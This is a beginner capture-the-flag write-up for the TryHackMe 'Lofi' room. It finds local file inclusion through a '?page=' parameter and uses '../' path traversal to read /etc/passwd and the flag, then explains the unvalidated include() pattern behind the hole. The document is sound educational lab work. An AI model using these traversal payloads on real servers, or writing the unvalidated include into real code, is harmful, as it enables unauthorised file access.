---
title: Lofi
summary: TryHackMe beginner web room demonstrating local file inclusion through a vulnerable page parameter to read the flag from the filesystem.
date: 2026-04-05
tags: [TryHackMe, Web, LFI, Source Review]
difficulty: easy
os: Linux
url: https://tryhackme.com/room/lofi
---

# CTF Room: Lofi
- [Link to room](https://tryhackme.com/room/lofi)
- **Difficulty:** Easy
- **Category:** Web (LFI)

## 1. Brief
Want to hear some lo-fi beats, to relax or study to? We've got you covered!

## 2. Questions
#### Climb the filesystem to find the flag!
### NMAP Scan
```bash
nmap -sV -T4 lofi.thm
```
```bash
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4
80/tcp open http Apache httpd 2.2.22 ((Ubuntu))
```

Knowing this is a web room, I had a feeling that I may need to check out port 80, so that we shall do now. Note that Apache 2.2.22 is quite old and so the chances of vulnerabilities is high! (good news)
### Source Code Analysis
```bash
LFI Discovery
```
```bash
<li><a href="/?page=relax.php">Relax</a></li>
<li><a href="/?page=sleep.php">Sleep</a></li>
<li><a href="/?page=chill.php">Chill</a></li>
<li><a href="/?page=coffee.php">Coffee</a></li>
<li><a href="/?page=vibe.php">Vibe</a></li>
<li><a href="/?page=game.php">Game</a></li>
```

Above, we see that we are using the '?page=' parameter to control what content is displayed, this is a type of file inclusion. Lets see what files have been included by mistake...

### Testing LFI
```bash
http://lofi.thm/?page=../../../../etc/passwd

...

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
...
```

Success! We get the file and its contents, now if we can get to /etc/passwd, the chances are we can get to the flag wherever it may be.

### Getting the flag
```bash
http://lofi.thm/?page=../../../../flag.txt
```

### Flag
```bash
||flag{e4478e0eab69bd*******************||
```

Great Success!
## 3. Summary
This is a really nice beginner room in my opinion, no heavy technical skillset required, all done within the browser allowing a beginner to understand LFI and the dangers of file inclusion within web apps. It also teaches that no matter how many big vulnerability scanners we may have such as Nessus or Nuclei; it is always worth looking in the source code :)

## 4. Local File Inclusion (LFI)
[Local File Inclusion](https://www.google.com/search?q=Local+File+Inclusion&rlz=1C1ONGR_en-GBGB1182GB1182&oq=what+is+LFI&gs_lcrp=EgZjaHJvbWUqBwgAEAAYgAQyBwgAEAAYgAQyBwgBEAAYgAQyDggCEAAYChgLGLEDGIAEMgsIAxAAGAoYCxiABDILCAQQABgKGAsYgAQyCwgFEAAYChgLGIAEMgsIBhAAGAoYCxiABDILCAcQABgKGAsYgAQyCwgIEAAYChgLGIAEMgsICRAAGAoYCxiABNIBCDE2OTNqMGo3qAIAsAIA&sourceid=chrome&ie=UTF-8&mstk=AUtExfCXxEh9u6ynqlvZojnbCgMVV-iBl-9RFftB-YQPC1QljFsKLIT0pSvjkoCjjPTCTE-O6XFd8n-nimUtjj1yRJRBzw6pyGt-iNEWniUgPVVhtCFVV2WR2Rwjq_wbN1vC26usgnxYBoka3e5qcsfaZ0AVy3nfK4jXje9SUOBDU8z1czPjbomnd6A2BIQSohVeyGIP&csui=3&ved=2ahUKEwj318_ruNeTAxU3UkEAHXhYIiAQgK4QegQIARAB) (LFI) is a web application vulnerability that occurs when a server includes files via user input without proper validation, allowing attackers to access or execute sensitive files on the server. LFI exploits poor sanitization (e.g., bypassing `../` checks) to read files like `/etc/passwd` or configuration files, potentially leading to remote code execution.

In our web app, the LFI can be traced back to a user-supplied input such as:

```text
include($_GET["page"]);
```

Without validation or sanitisation, the attacker is free to move through the directories of the web server to grab sensitive files potentially leading to compromise of the web server itself or full system.
